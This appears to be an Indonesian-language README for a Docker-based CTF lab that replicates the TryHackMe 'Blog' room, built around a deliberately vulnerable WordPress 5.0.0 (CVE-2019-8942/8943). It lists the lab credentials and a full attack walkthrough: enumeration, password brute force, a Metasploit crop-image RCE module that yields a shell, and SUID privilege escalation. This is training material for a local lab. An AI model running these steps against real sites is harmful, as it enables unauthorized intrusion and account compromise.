# Blog CTF - TryHackMe "Blog" Room Replica

Replica dari room [TryHackMe: Blog](https://tryhackme.com/room/blog).
WordPress 5.0.0 vulnerable ke CVE-2019-8942/8943 (Crop Image RCE).

---

## Quick Start

```bash
# 1. Build & jalankan
docker compose up --build -d

# 2. Tambahkan ke /etc/hosts
echo "127.0.0.1 blog.thm" | sudo tee -a /etc/hosts

# 3. Tunggu ~60 detik sampai WP selesai install
docker logs blog-ctf -f

# 4. Buka browser
# http://blog.thm
```

---

## Info Lab

| Item | Value |
|------|-------|
| URL | http://blog.thm |
| WP Version | 5.0.0 (vulnerable) |
| CVE | CVE-2019-8942 / CVE-2019-8943 |

### Port yang terbuka
| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP (WordPress 5.0.0) |
| 139 | SMB/NetBIOS |
| 445 | SMB |

### WordPress Users
| Username | Password | Role |
|----------|----------|------|
| bjoel | JJJohnyJohnny | Admin |
| kwheel | cutiepie1 | Author (target) |

### Flags
| File | Keterangan |
|------|-----------|
| `/home/bjoel/user.txt` | ❌ Fake flag (rabbit hole) |
| `/media/usb/user.txt` | ✅ Real user flag |
| `/root/root.txt` | ✅ Root flag |

---

## Intended Attack Path

### 1. Recon
```bash
nmap -sV -sC -p 22,80,139,445 blog.thm
```

### 2. WordPress Enumeration
```bash
wpscan --url http://blog.thm --enumerate u
```
→ Temukan user: `bjoel`, `kwheel`

### 3. Bruteforce Password
```bash
wpscan --url http://blog.thm \
  --usernames kwheel \
  --passwords /usr/share/wordlists/rockyou.txt
```
→ `kwheel:cutiepie1`

### 4. Exploit CVE-2019-8942 (Crop Image RCE)
```bash
msfconsole
use exploit/multi/http/wp_crop_rce
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <your-ip>
run
```
→ Shell sebagai `www-data`

### 5. Privesc via SUID checker
```bash
# Di dalam shell
find / -perm -4000 -type f 2>/dev/null
# Temukan: /usr/sbin/checker

export admin=1
/usr/sbin/checker
# → root shell!
```

### 6. Ambil flags
```bash
cat /media/usb/user.txt   # real user flag
cat /root/root.txt         # root flag
```

---

## SMB Enumeration (bonus)
```bash
smbclient -L //blog.thm -N
smbclient //blog.thm/BillySMBShare -N
```

---

## Cheat Sheet untuk Peserta CTF

> **Hint 1:** Jangan terpancing sama file yang ada di home directory bjoel  
> **Hint 2:** Cek SUID binaries — ada yang gak lazim  
> **Hint 3:** Binary `checker` ngecek sesuatu di environment variable

---

## Cleanup
```bash
docker compose down -v
sudo sed -i '/blog.thm/d' /etc/hosts
```
